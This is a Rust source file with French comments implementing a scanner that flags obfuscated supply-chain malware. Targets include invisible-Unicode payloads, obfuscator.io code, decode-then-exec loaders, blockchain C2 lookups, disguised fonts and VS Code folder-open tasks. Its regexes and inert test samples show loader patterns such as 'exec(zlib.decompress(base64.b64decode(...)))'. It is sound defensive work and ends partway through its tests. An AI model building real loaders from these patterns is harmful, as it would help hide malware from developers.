use crate::scanner::{Category, Finding, Scanner, Severity};
use crate::walk;
use regex::Regex;
use std::fs;
use std::io::Read;
use std::path::{Path, PathBuf};
use std::sync::LazyLock;

pub struct ObfuscationScanner;

/// Les campagnes 2025-2026 (GlassWorm, Shai-Hulud, obfuscator.io sur npm,
/// chargeurs PyPI en une ligne) ne cachent plus leur charge dans un fichier de
/// config : elle est dans `dist/index.js` d'une dépendance, dans l'extension
/// d'un éditeur ou dans un `.pth`. On regarde donc tout le code, dépendances
/// comprises.
const CODE_EXTENSIONS: &[&str] = &["js", "cjs", "mjs", "jsx", "ts", "tsx", "py", "pth"];

/// `bun_environment.js` pèse ~10 Mo ; au-delà de 32 Mo ce n'est plus du code
/// qu'on lit ligne à ligne mais un artefact.
const MAX_FILE_BYTES: u64 = 32 * 1024 * 1024;

/// En dessous, une suite de caractères invisibles s'explique (drapeau emoji à
/// tags, sélecteur de variation après un emoji). Au-dessus, c'est un octet de
/// charge par caractère : la technique GlassWorm.
const INVISIBLE_RUN_THRESHOLD: usize = 16;

/// Le nommage `_0x1a2b` d'obfuscator.io : un bundle minifié classique n'en
/// produit pas, un fichier obfusqué en aligne des centaines.
const OBFUSCATOR_ID_THRESHOLD: usize = 30;

const CONFIG_PATTERNS: &[&str] = &[
    "*.config.js",
    "*.config.mjs",
    "*.config.cjs",
    "*.config.ts",
    ".eslintrc.js",
    ".prettierrc.js",
    "rollup.config.*",
    "vite.config.*",
    "webpack.config.*",
    "next.config.*",
    "nuxt.config.*",
    "tailwind.config.*",
    "postcss.config.*",
    "jest.config.*",
];

static EXEC_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(
        r"\b(?:eval|exec|execScript|Function|runInThisContext|runInNewContext|createScript)\s*\(",
    )
    .unwrap()
});

static DECODE_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(
        r#"\b(?:atob|b64decode|b85decode|a85decode|b32decode|decompress|marshal\.loads|fromhex|unhexlify|codePointAt)\s*\(|\bcodecs\.decode\s*\(|Buffer\.from\s*\([^)]{0,400}['"](?:base64|hex)['"]|\[::-1\]"#,
    )
    .unwrap()
});

static OBFUSCATOR_ID_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"\b_0x[0-9a-f]{4,6}\b").unwrap());

/// Rotation du tableau de chaînes d'obfuscator.io :
/// `_0x1f2e['push'](_0x1f2e['shift']())` dans une boucle `while(!![])`.
static STRING_ARRAY_ROTATION_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"\[['"]push['"]\]\(\s*_0x\w+\[['"]shift['"]\]\(\)\s*\)|while\s*\(\s*!!\[\]\s*\)"#)
        .unwrap()
});

/// Le stager qui se tait en CI puis se détache de `npm install` (Microsoft,
/// mai 2026) : seul, ce motif est banal (update-notifier fait pareil), il ne
/// sert qu'à aggraver un fichier déjà obfusqué.
static CI_EVASION_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"process\.env\.CI\b|env\[['"]CI['"]\]|GITHUB_ACTIONS|\bis-ci\b"#).unwrap()
});
static DETACHED_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"\.unref\(\)|detached\s*:\s*(?:true|!0)").unwrap());

static PTH_EXEC_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(
        r"\b(?:b64decode|base64|marshal|zlib|fromhex|codecs|subprocess|urlopen|urllib|socket|requests)\b",
    )
    .unwrap()
});

static GLOBAL_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r#"global\[|_\$_[0-9a-f]"#).unwrap());
static HEX_HEAVY_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"\\x[0-9a-fA-F]{2}(?:\\x[0-9a-fA-F]{2}){20,}").unwrap());

/// PolinRider (2026) : marqueur de campagne `var z = '-5289-1'` ou
/// `global['!']='9-5289-1'` en tête de la charge.
static POLINRIDER_MARKER_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r#"['"]\d?-5289-\d+['"]"#).unwrap());

/// Charge collée en fin de ligne d'une config, poussée hors de l'écran par une
/// longue suite d'espaces.
static SPACE_HIDDEN_CODE_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"\S {150,}\S").unwrap());

/// Commande C2 lue dans une transaction blockchain.
static CHAIN_C2_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"api\.trongrid\.io|eth_getTransactionByHash").unwrap());

/// Chargeur qui lit sa charge dans une transaction blockchain puis la lance :
/// la variante Python de PolinRider écrit un `.js` temporaire et le passe à
/// node via `subprocess`.
static CHAIN_LOOKUP_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"api\.trongrid\.io|eth_getTransactionByHash|getAddressTransactions").unwrap()
});
static SPAWN_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(
        r"\bsubprocess\b|child_process|\bexecSync\s*\(|\bspawn\s*\(|\bos\.(?:system|popen|exec[lv]p?e?)\s*\(|\bPopen\s*\(",
    )
    .unwrap()
});

/// Le code de la transaction est relu depuis son champ `input` en hexadécimal.
static TX_INPUT_DECODE_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"fromhex|unhexlify|hexToUtf8|hexToString|toUtf8String|Buffer\.from\s*\([^)]{0,200}['"]hex['"]"#)
        .unwrap()
});

/// Fenêtre autour d'un indice : le chargeur tient en quelques dizaines de
/// lignes, un bundle web3 étale les mêmes mots sur des mégaoctets.
const LOADER_WINDOW: usize = 3000;

static PROCESS_ENV_RE: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"process\.env\b").unwrap());
static B64_DECODE_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"\batob\s*\(|Buffer\.from\s*\([^)]{0,200}['"]base64['"]"#).unwrap()
});
static DOWNLOAD_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"\bfetch\s*\(|node-fetch|\bhttps?\.get\s*\(|\baxios\b|\bgot\s*\(|\brequest\s*\(|\burlopen\s*\("#)
        .unwrap()
});
/// Évaluation de code, sans le `exec` de child_process.
static EVAL_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"\beval\s*\(|\bFunction\s*\(|runInThisContext|runInNewContext").unwrap()
});

/// Tranche `[at - before, at + after]` alignée sur des frontières UTF-8.
fn window(content: &str, at: usize, before: usize, after: usize) -> &str {
    let mut start = at.saturating_sub(before);
    while !content.is_char_boundary(start) {
        start -= 1;
    }
    let mut end = (at + after).min(content.len());
    while !content.is_char_boundary(end) {
        end += 1;
    }
    &content[start..end]
}

/// Valeur `.env` qui est une URL encodée en base64 (`aHR0cDovL` = `http://`,
/// `aHR0cHM6Ly` = `https://`).
static ENV_B64_URL_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"(?m)^\s*(?:export\s+)?\w+\s*=\s*['"]?aHR0c(?:DovL|HM6Ly)"#).unwrap()
});

/// `"dev": "node init && next dev"` : le fichier `init` sans extension est le
/// chargeur, quel que soit l'enchaînement qui suit (`&&`, `;`, `||`, rien).
static NODE_INIT_SCRIPT_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r#":\s*"[^"]*\bnode\s+(?:\./)?init["\s;&|]"#).unwrap());

static NODE_CMD_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(?i)\bnode(?:\.exe)?\b|\.(?:ttf|otf|woff2?|eot)\b").unwrap());

static JS_LOADER_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"\brequire\s*\(|child_process|\beval\s*\(|\bFunction\s*\(|module\.exports").unwrap()
});

/// Fichiers que seule la recherche d'IOC PolinRider doit ouvrir.
fn is_polinrider_file(file_path: &Path, filename: &str, ext: &str) -> bool {
    walk::FONT_EXTENSIONS.contains(&ext)
        || filename == "package.json"
        || filename == ".gitignore"
        || filename == "init"
        || filename.starts_with(".env")
        || filename.ends_with(".env")
        || filename.eq_ignore_ascii_case("config.bat")
        || (filename == "tasks.json"
            && file_path
                .parent()
                .and_then(|p| p.file_name())
                .is_some_and(|p| p == ".vscode"))
}

/// Une police qui ne commence pas par une signature de police est un
/// fichier déguisé : Node exécute un script même si un commentaire y glisse
/// un octet NUL ou de l'UTF-8 invalide. Un pointeur Git LFS est le texte
/// normal d'une police non récupérée.
fn font_is_disguised(head: &[u8]) -> bool {
    const MAGIC: &[&[u8]] = &[
        b"\x00\x01\x00\x00",
        b"OTTO",
        b"true",
        b"typ1",
        b"ttcf",
        b"wOFF",
        b"wOF2",
    ];
    if head.is_empty() || head.starts_with(b"version https://git-lfs") {
        return false;
    }
    let eot = head.get(34..36) == Some(b"LP");
    !eot && !MAGIC.iter().any(|m| head.starts_with(m))
}

/// `tasks.json` est du JSONC : commentaires et virgules finales acceptés par
/// VS Code, refusés par serde_json.
fn strip_jsonc(content: &str) -> String {
    let mut out = String::with_capacity(content.len());
    let mut chars = content.chars().peekable();
    let mut in_string = false;
    while let Some(c) = chars.next() {
        if in_string {
            out.push(c);
            if c == '\\' {
                out.extend(chars.next());
            } else if c == '"' {
                in_string = false;
            }
            continue;
        }
        match (c, chars.peek()) {
            ('"', _) => {
                in_string = true;
                out.push(c);
            }
            ('/', Some('/')) => {
                for n in chars.by_ref() {
                    if n == '\n' {
                        out.push('\n');
                        break;
                    }
                }
            }
            ('/', Some('*')) => {
                chars.next();
                let mut prev = ' ';
                for n in chars.by_ref() {
                    if prev == '*' && n == '/' {
                        break;
                    }
                    prev = n;
                }
            }
            _ => out.push(c),
        }
    }
    TRAILING_COMMA_RE.replace_all(&out, "$1").into_owned()
}

static TRAILING_COMMA_RE: LazyLock<Regex> = LazyLock::new(|| Regex::new(r",(\s*[}\]])").unwrap());

/// Gravité d'un `tasks.json` : CRITICAL quand la tâche lancée à l'ouverture,
/// ou une tâche dont elle dépend, appelle node ou une police ; MEDIUM pour un
/// watcher ordinaire. Un fichier illisible reste HIGH.
fn folder_open_severity(content: &str) -> Severity {
    let Ok(json) = serde_json::from_str::<serde_json::Value>(&strip_jsonc(content)) else {
        return Severity::High;
    };
    let tasks = json["tasks"].as_array().cloned().unwrap_or_default();
    let mut run: Vec<&serde_json::Value> = tasks
        .iter()
        .filter(|t| t["runOptions"]["runOn"] == "folderOpen")
        .collect();
    if run.is_empty() {
        return Severity::High;
    }
    // Suit `dependsOn` jusqu'à ce que l'ensemble ne grossisse plus.
    let mut i = 0;
    while i < run.len() {
        let deps: Vec<String> = match &run[i]["dependsOn"] {
            serde_json::Value::String(d) => vec![d.clone()],
            serde_json::Value::Array(a) => a
                .iter()
                .filter_map(|d| d.as_str().map(String::from))
                .collect(),
            _ => Vec::new(),
        };
        for t in &tasks {
            let label = t["label"].as_str().unwrap_or("");
            if deps.iter().any(|d| d == label) && !run.iter().any(|r| std::ptr::eq(*r, t)) {
                run.push(t);
            }
        }
        i += 1;
    }
    if run.iter().any(|t| NODE_CMD_RE.is_match(&t.to_string())) {
        Severity::Critical
    } else {
        Severity::Medium
    }
}

fn first_line_matching(content: &str, re: &Regex) -> Option<u32> {
    re.find(content).map(|m| line_of(content, m.start()))
}

/// Indicateurs PolinRider : chargeur JS déguisé en police, tâche VS Code
/// lancée à l'ouverture du dossier, script `node init &&`, `config.bat` et sa
/// ligne de `.gitignore`, marqueur de campagne, C2 sur blockchain.
fn scan_polinrider(relative: &str, filename: &str, ext: &str, bytes: &[u8]) -> Vec<Finding> {
    let mut out = Vec::new();
    let mut push = |severity, rule: &str, title: &str, line: Option<u32>| {
        out.push(finding(
            severity,
            rule,
            title.into(),
            relative,
            line,
            Some("PolinRider indicator".into()),
        ));
    };

    if walk::FONT_EXTENSIONS.contains(&ext) {
        if font_is_disguised(&bytes[..bytes.len().min(64)]) {
            push(
                Severity::Critical,
                "font-disguised-script",
                "font file has no font signature: disguised script",
                Some(1),
            );
        }
        return out;
    }
    if filename.eq_ignore_ascii_case("config.bat") {
        // Celui de PolinRider relance node ; un vrai script Windows non.
        let severity = if NODE_CMD_RE.is_match(&String::from_utf8_lossy(bytes)) {
            Severity::High
        } else {
            Severity::Medium
        };
        push(severity, "config-bat-dropper", "config.bat dropper", None);
        return out;
    }

    let content = String::from_utf8_lossy(bytes);
    match filename {
        ".gitignore" => {
            if let Some(i) = content.lines().position(|l| {
                let entry = l.trim();
                let entry = entry
                    .strip_prefix("**/")
                    .or_else(|| entry.strip_prefix('/'))
                    .unwrap_or(entry);
                entry.eq_ignore_ascii_case("config.bat")
            }) {
                push(
                    Severity::High,
                    "gitignore-config-bat",
                    "config.bat hidden by .gitignore",
                    Some(i as u32 + 1),
                );
            }
        }
        "package.json" => {
            if let Some(line) = first_line_matching(&content, &NODE_INIT_SCRIPT_RE) {
                push(
                    Severity::Critical,
                    "node-init-script",
                    "npm script runs an extensionless `init` loader",
                    Some(line),
                );
            }
        }
        "tasks.json" => {
            if let Some(at) = content.find("folderOpen") {
                let line = line_of(&content, at);
                let severity = folder_open_severity(&content);
                let title = if severity == Severity::Critical {
                    "VS Code task runs node when the folder opens"
                } else {
                    "VS Code task runs when the folder opens"
                };
                push(severity, "vscode-folderopen-task", title, Some(line));
            }
        }
        // Node saute la ligne `#!` quel que soit l'interpréteur : un shebang
        // shell n'exempte que si rien d'autre ne trahit le chargeur.
        f if f.starts_with(".env") || f.ends_with(".env") => {
            if let Some(line) = first_line_matching(&content, &ENV_B64_URL_RE) {
                push(
                    Severity::High,
                    "env-base64-url",
                    "environment value is a base64-encoded URL (hidden C2 address)",
                    Some(line),
                );
            }
        }
        "init"
            if JS_LOADER_RE.is_match(&content)
                && !(content.starts_with("#!")
                    && !content.lines().next().unwrap_or("").contains("node")
                    && !CHAIN_C2_RE.is_match(&content)
                    && !POLINRIDER_MARKER_RE.is_match(&content)
                    && !content.contains("child_process")) =>
        {
            let severity =
                if CHAIN_C2_RE.is_match(&content) || POLINRIDER_MARKER_RE.is_match(&content) {
                    Severity::Critical
                } else {
                    Severity::High
                };
            push(
                severity,
                "extensionless-js-loader",
                "extensionless `init` file holds JavaScript",
                Some(1),
            );
        }
        _ => {}
    }
    out
}

/// Marqueur de campagne PolinRider, dans tout fichier de code ou de config.
fn scan_campaign_marker(relative: &str, content: &str) -> Option<Finding> {
    first_line_matching(content, &POLINRIDER_MARKER_RE).map(|line| {
        finding(
            Severity::Critical,
            "polinrider-marker",
            "PolinRider campaign marker (-5289-)".into(),
            relative,
            Some(line),
            Some("PolinRider indicator".into()),
        )
    })
}

fn is_config_file(filename: &str) -> bool {
    CONFIG_PATTERNS.iter().any(|pat| {
        let pat_clean = pat.replace("*", "");
        if pat.starts_with('*') && pat.ends_with('*') {
            filename.contains(pat_clean.trim_matches('.'))
        } else if pat.starts_with('*') {
            filename.ends_with(&pat_clean)
        } else if pat.ends_with('*') {
            filename.starts_with(&pat_clean)
        } else {
            filename == pat_clean || filename == *pat
        }
    })
}

/// Caractères qui ne s'affichent pas et qu'un décodeur relit octet par octet.
///
/// Les sélecteurs de variation et les tags sont la technique GlassWorm : une
/// rafale n'a aucune raison d'exister dans du code. La zone à usage privé et
/// les espaces de largeur nulle, eux, peuplent des tables légitimes (pages de
/// code de SheetJS, polices d'icônes) : ils ne comptent qu'à côté d'un
/// décodeur et d'un eval.
#[derive(Clone, Copy, PartialEq)]
enum Invisible {
    Selector,
    Private,
}

fn invisible_kind(c: char) -> Option<Invisible> {
    match c as u32 {
        0xFE00..=0xFE0F | 0xE0100..=0xE01EF | 0xE0000..=0xE007F => Some(Invisible::Selector),
        0xE000..=0xF8FF | 0xF0000..=0xFFFFD | 0x200B..=0x200D | 0x2060..=0x2064 => {
            Some(Invisible::Private)
        }
        _ => None,
    }
}

fn line_len_at(content: &str, i: usize) -> usize {
    let start = content[..i].rfind('\n').map_or(0, |p| p + 1);
    let end = content[i..].find('\n').map_or(content.len(), |p| i + p);
    end - start
}

/// Contrôles bidirectionnels (Trojan Source, CVE-2021-42574) : le code relu à
/// l'écran n'est pas celui que le compilateur exécute.
fn is_bidi_control(c: char) -> bool {
    matches!(c as u32, 0x202A..=0x202E | 0x2066..=0x2069)
}

/// Appels d'exécution dynamique, sans les méthodes homonymes : `re.exec(`
/// (RegExp) et `cursor.execute` sont partout dans un bundle minifié.
fn exec_calls(text: &str) -> impl Iterator<Item = regex::Match<'_>> {
    EXEC_RE.find_iter(text).filter(move |m| {
        let vm = text[m.start()..].starts_with("run") || text[m.start()..].starts_with("create");
        vm || m.start() == 0 || text.as_bytes()[m.start() - 1] != b'.'
    })
}

fn line_of(content: &str, byte_offset: usize) -> u32 {
    (content[..byte_offset]
        .bytes()
        .filter(|b| *b == b'\n')
        .count()
        + 1) as u32
}

/// Longue ligne quasi exclusivement base64. Les `data:` URI (polices, wasm,
/// images) et les source maps sont des blobs légitimes : on les écarte.
fn encoded_blob_line(content: &str) -> Option<usize> {
    let mut offset = 0;
    for line in content.split_inclusive('\n') {
        let len = line.len();
        // `AGFzbQ` = base64 de `\0asm` : un module WebAssembly embarqué
        // (undici, vite, lexers), pas du code qu'on exécute via eval.
        if len > 2000
            && !line.contains("data:")
            && !line.contains("sourceMappingURL")
            && !line.contains("AGFzbQ")
        {
            let b64 = line
                .bytes()
                .filter(|b| b.is_ascii_alphanumeric() || matches!(b, b'+' | b'/' | b'='))
                .count();
            // Une police ou une table passée à `toByteArray` n'est pas une
            // charge : on ne retient que le blob donné à eval/exec sur sa ligne.
            if b64 * 100 >= len * 95 && exec_calls(line).next().is_some() {
                return Some(offset);
            }
        }
        offset += len;
    }
    None
}

fn finding(
    severity: Severity,
    rule: &str,
    title: String,
    file: &str,
    line: Option<u32>,
    detail: Option<String>,
) -> Finding {
    Finding {
        severity,
        category: Category::Obfuscation,
        scanner: "obfuscation".into(),
        title: format!("{title} ({rule})"),
        file: Some(file.to_string()),
        line,
        detail,
    }
}

/// Analyse d'un fichier de code. Séparée du parcours pour être testable.
pub fn scan_content(relative: &str, content: &str) -> Vec<Finding> {
    let mut out = Vec::new();
    let is_pth = relative.ends_with(".pth");
    let has_exec = exec_calls(content).next().is_some();

    // Caractères invisibles en rafale.
    let mut run = 0usize;
    let mut run_start = 0usize;
    let mut run_kind = Invisible::Private;
    let mut best: [Option<(usize, usize)>; 2] = [None, None];
    let mut bidi_at: Option<usize> = None;
    for (i, c) in content.char_indices() {
        match invisible_kind(c) {
            Some(kind) => {
                if run == 0 || kind != run_kind {
                    run = 0;
                    run_start = i;
                    run_kind = kind;
                }
                run += 1;
                let slot = &mut best[kind as usize];
                if run >= INVISIBLE_RUN_THRESHOLD && slot.is_none_or(|(_, n)| run > n) {
                    *slot = Some((run_start, run));
                }
            }
            None => run = 0,
        }
        // Une table de décodage HTML ou Unicode tient sur une ligne de
        // plusieurs milliers de caractères ; Trojan Source vise du code lisible.
        if bidi_at.is_none() && is_bidi_control(c) && line_len_at(content, i) < 1000 {
            bidi_at = Some(i);
        }
    }
    let decoder = content.contains("codePointAt");
    let hidden = match best {
        [Some((at, n)), _] => Some((at, n, has_exec || decoder)),
        [None, Some((at, n))] if has_exec && decoder => Some((at, n, true)),
        _ => None,
    };
    if let Some((at, n, armed)) = hidden {
        let (severity, detail) = if armed {
            (
                Severity::Critical,
                "invisible characters next to a decoder/eval: GlassWorm-style hidden payload",
            )
        } else {
            (
                Severity::High,
                "invisible characters carry bytes that code review does not show",
            )
        };
        out.push(finding(
            severity,
            "invisible-unicode-payload",
            format!("{n} consecutive invisible Unicode characters"),
            relative,
            Some(line_of(content, at)),
            Some(detail.into()),
        ));
    }
    // Trojan Source vise le code qu'un humain relit en revue : celui du projet.
    // Dans une dépendance, ces caractères peuplent des regex Unicode et des
    // chaînes i18n (react-aria, katex, spacy).
    if let Some(at) = bidi_at.filter(|_| !walk::is_dependency_path(relative)) {
        out.push(finding(
            Severity::High,
            "bidi-control",
            "bidirectional control character in source (Trojan Source)".into(),
            relative,
            Some(line_of(content, at)),
            None,
        ));
    }

    // Décodage puis exécution sur la même ligne : le chargeur une ligne de
    // PyPI (inverse + base64 + zlib/marshal + exec) et `eval(atob(...))`.
    let mut offset = 0;
    let mut chain_found = false;
    for line in content.split_inclusive('\n') {
        if !chain_found {
            let near = exec_calls(line).any(|e| {
                DECODE_RE
                    .find_iter(line)
                    .any(|d| d.start().abs_diff(e.start()) <= 400)
            });
            if near {
                out.push(finding(
                    Severity::Critical,
                    "decode-exec-chain",
                    "decoded payload passed straight to eval/exec".into(),
                    relative,
                    Some(line_of(content, offset)),
                    None,
                ));
                chain_found = true;
            }
        }
        offset += line.len();
    }

    // obfuscator.io.
    let ids = OBFUSCATOR_ID_RE
        .find_iter(content)
        .take(OBFUSCATOR_ID_THRESHOLD)
        .count();
    let obfuscator = ids >= OBFUSCATOR_ID_THRESHOLD;
    if obfuscator {
        let rotation = STRING_ARRAY_ROTATION_RE.find(content);
        let first = OBFUSCATOR_ID_RE
            .find(content)
            .map(|m| m.start())
            .unwrap_or(0);
        let (severity, title) = match rotation {
            Some(_) => (
                Severity::Critical,
                "obfuscator.io string array with rotation",
            ),
            None => (Severity::High, "obfuscator.io-style _0x identifiers"),
        };
        out.push(finding(
            severity,
            "obfuscator-io",
            title.into(),
            relative,
            Some(line_of(
                content,
                rotation.map(|m| m.start()).unwrap_or(first),
            )),
            None,
        ));
    }

    // Blob encodé passé à eval/exec sur la même ligne.
    if let Some(at) = encoded_blob_line(content) {
        out.push(finding(
            Severity::High,
            "encoded-blob-exec",
            "large base64 blob fed to eval/exec/Function".into(),
            relative,
            Some(line_of(content, at)),
            None,
        ));
    }

    // `.pth` : exécuté à chaque démarrage de Python, sans import.
    if is_pth {
        let mut offset = 0;
        for line in content.split_inclusive('\n') {
            let t = line.trim_start();
            if t.starts_with("import") && PTH_EXEC_RE.is_match(t) {
                out.push(finding(
                    Severity::Critical,
                    "pth-startup-exec",
                    ".pth file runs code at every Python start".into(),
                    relative,
                    Some(line_of(content, offset)),
                    None,
                ));
                break;
            }
            offset += line.len();
        }
    }

    // Charge lue dans une transaction blockchain puis lancée (PolinRider,
    // variante Python du 2026-11-10).
    if let Some(m) = CHAIN_LOOKUP_RE.find_iter(content).find(|m| {
        let w = window(content, m.start(), LOADER_WINDOW, LOADER_WINDOW);
        TX_INPUT_DECODE_RE.is_match(w) && (SPAWN_RE.is_match(w) || EVAL_RE.is_match(w))
    }) {
        out.push(finding(
            Severity::Critical,
            "chain-c2-loader",
            "code fetched from a blockchain transaction is executed".into(),
            relative,
            Some(line_of(content, m.start())),
            None,
        ));
    }
    // URL cachée en base64 dans l'environnement, téléchargée puis évaluée
    // dans la foulée : un bundle qui décode une config JSON depuis l'env et
    // contient un `exec(` sans rapport bien plus loin n'est pas un chargeur.
    if let Some(m) = PROCESS_ENV_RE.find_iter(content).find(|m| {
        let w = window(content, m.start(), 64, 1000);
        B64_DECODE_RE.is_match(w) && DOWNLOAD_RE.is_match(w) && EVAL_RE.is_match(w)
    }) {
        out.push(finding(
            Severity::Critical,
            "env-remote-eval",
            "decodes a URL from an environment variable and evals what it downloads".into(),
            relative,
            Some(line_of(content, m.start())),
            None,
        ));
    }

    // Un fichier déjà suspect qui se tait en CI et se détache du processus
    // parent : c'est le stager, pas un outil.
    if !out.is_empty() && CI_EVASION_RE.is_match(content) && DETACHED_RE.is_match(content) {
        for f in &mut out {
            f.severity = Severity::Critical;
            f.detail = Some(match f.detail.take() {
                Some(d) => format!("{d}; exits under CI and runs detached"),
                None => "exits under CI and runs detached".into(),
            });
        }
    }

    out
}

/// Heuristiques historiques, réservées aux fichiers de config où une ligne de
/// 500 caractères n'a rien à faire.
fn scan_config(relative: &str, content: &str) -> Vec<Finding> {
    let mut out = Vec::new();
    for (line_num, line) in content.lines().enumerate() {
        let line_no = Some((line_num + 1) as u32);
        if line.len() > 500 {
            let trimmed = line.trim();
            let looks_like_data = trimmed.starts_with('{')
                || trimmed.starts_with('[')
                || trimmed.starts_with("//")
                || trimmed.contains("sourceMap")
                || trimmed.contains("webpack");
            let severity = if looks_like_data || line.len() < 1000 {
                Severity::Medium
            } else {
                Severity::High
            };
            out.push(finding(
                severity,
                "config-long-line",
                format!("line >500 chars ({} chars) in config file", line.len()),
                relative,
                line_no,
                None,
            ));
        }
        if GLOBAL_RE.is_match(line) {
            out.push(finding(
                Severity::High,
                "config-global-accessor",
                "suspicious global[] or _$_ pattern".into(),
                relative,
                line_no,
                None,
            ));
        }
        if SPACE_HIDDEN_CODE_RE.is_match(line) {
            out.push(finding(
                Severity::High,
                "config-space-hidden-code",
                "code pushed off-screen by a long run of spaces".into(),
                relative,
                line_no,
                None,
            ));
        }
        if CHAIN_C2_RE.is_match(line) {
            out.push(finding(
                Severity::Critical,
                "config-chain-c2",
                "config file reads commands from a blockchain transaction".into(),
                relative,
                line_no,
                None,
            ));
        }
        if HEX_HEAVY_RE.is_match(line) {
            out.push(finding(
                Severity::High,
                "config-hex-payload",
                "heavy hex-encoded content in config".into(),
                relative,
                line_no,
                None,
            ));
        }
    }
    out
}

fn scan_file(target: &Path, file_path: &Path) -> Vec<Finding> {
    let filename = file_path.file_name().and_then(|n| n.to_str()).unwrap_or("");
    let ext = file_path
        .extension()
        .and_then(|e| e.to_str())
        .map(|e| e.to_ascii_lowercase())
        .unwrap_or_default();
    let config = is_config_file(filename);
    let code = CODE_EXTENSIONS.contains(&ext.as_str()) && !filename.ends_with(".d.ts");
    let ioc = is_polinrider_file(file_path, filename, &ext);
    if !config && !code && !ioc {
        return Vec::new();
    }
    // Pour une police, seuls les 64 premiers octets servent.
    let bytes = if walk::FONT_EXTENSIONS.contains(&ext.as_str()) {
        fs::File::open(file_path).and_then(|f| {
            let mut head = Vec::with_capacity(64);
            f.take(64).read_to_end(&mut head).map(|_| head)
        })
    } else if fs::metadata(file_path).is_ok_and(|m| m.len() > MAX_FILE_BYTES) {
        return Vec::new();
    } else {
        fs::read(file_path)
    };
    let Ok(bytes) = bytes else {
        return Vec::new();
    };
    let relative = file_path
        .strip_prefix(target)
        .unwrap_or(file_path)
        .to_string_lossy()
        .to_string();
    let mut out = if ioc {
        scan_polinrider(&relative, filename, &ext, &bytes)
    } else {
        Vec::new()
    };
    if !config && !code {
        return out;
    }
    let content = String::from_utf8_lossy(&bytes);

    if code {
        out.extend(scan_content(&relative, &content));
    }
    if config {
        out.extend(scan_config(&relative, &content));
    }
    out.extend(scan_campaign_marker(&relative, &content));
    out
}

impl Scanner for ObfuscationScanner {
    fn name(&self) -> &str {
        "obfuscation"
    }
    fn category(&self) -> Category {
        Category::Obfuscation
    }
    fn scan(&self, target: &Path) -> Vec<Finding> {
        let files: Vec<PathBuf> = walk::walk_files_including_deps(target);
        let workers = std::thread::available_parallelism().map_or(4, |n| n.get());
        let chunk = files.len().div_ceil(workers).max(1);

        let mut findings: Vec<Finding> = std::thread::scope(|s| {
            let handles: Vec<_> = files
                .chunks(chunk)
                .map(|part| {
                    s.spawn(move || {
                        part.iter()
                            .flat_map(|f| scan_file(target, f))
                            .collect::<Vec<_>>()
                    })
                })
                .collect();
            handles
                .into_iter()
                .flat_map(|h| h.join().unwrap_or_default())
                .collect()
        });
        findings.sort_by(|a, b| {
            b.severity
                .cmp(&a.severity)
                .then_with(|| a.file.cmp(&b.file))
        });
        findings
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn rules(found: &[Finding]) -> Vec<String> {
        found.iter().map(|f| f.title.clone()).collect()
    }

    #[test]
    fn glassworm_invisible_payload_with_decoder_is_critical() {
        let hidden: String = (0..40)
            .map(|i| char::from_u32(0xFE00 + (i % 16)).unwrap())
            .collect();
        let src = format!(
            "const s = `{hidden}`;\nconst b = [...s].map(c => c.codePointAt(0) - 0xFE00);\neval(Buffer.from(b).toString());\n"
        );
        let found = scan_content("dist/extension.js", &src);
        let f = found
            .iter()
            .find(|f| f.title.contains("invisible-unicode-payload"))
            .unwrap();
        assert_eq!(f.severity, Severity::Critical);
        assert_eq!(f.line, Some(1));
    }

    #[test]
    fn emoji_variation_selectors_and_flag_tags_are_not_flagged() {
        let src = "const ok = '❤️ ✔️ 🏴\u{E0067}\u{E0062}\u{E0065}\u{E006E}\u{E0067}\u{E007F}';\n";
        assert!(scan_content("src/emoji.ts", src).is_empty());
    }

    #[test]
    fn codepage_tables_in_private_use_area_are_not_flagged() {
        let table: String = (0..64)
            .map(|i| char::from_u32(0xE000 + i).unwrap())
            .collect();
        let src = format!(
            "var d = \"{table}\"; for (i = 0; i < d.length; ++i) e[d.charCodeAt(i)] = i;\n"
        );
        assert!(scan_content("node_modules/codepage/bits/10001.js", &src).is_empty());
    }

    #[test]
    fn pypi_one_line_loader_is_flagged() {
        let src = "import base64,zlib;exec(zlib.decompress(base64.b64decode(b'eJzLSM3JyQcABiwCFQ=='[::-1])))\n";
        let found = scan_content("pymem/__init__.py", src);
        assert!(
            rules(&found)
                .iter()
                .any(|t| t.contains("decode-exec-chain")),
            "{found:?}"
        );
    }

    #[test]
    fn obfuscator_io_rotation_is_critical() {
        let ids: String = (0..40)
            .map(|i| format!("var _0x{:04x}=1;", 0x1a00 + i))
            .collect();
        let src = format!(
            "{ids}\n(function(_0x1a00){{while(!![]){{_0x1a00['push'](_0x1a00['shift']());}}}})();\n"
        );
        let found = scan_content("node_modules/evil/index.js", &src);
        let f = found
            .iter()
            .find(|f| f.title.contains("obfuscator-io"))
            .unwrap();
        assert_eq!(f.severity, Severity::Critical);
    }

    #[test]
    fn wasm_data_uri_and_plain_minified_code_are_not_flagged() {
        let blob = "A".repeat(5000);
        let src = format!(
            "var w='data:application/wasm;base64,{blob}';var f=new Function('return this')();\nfunction a(b){{return b+1}}\n"
        );
        assert!(scan_content("node_modules/sql.js/dist/sql-wasm.js", &src).is_empty());
    }

    #[test]
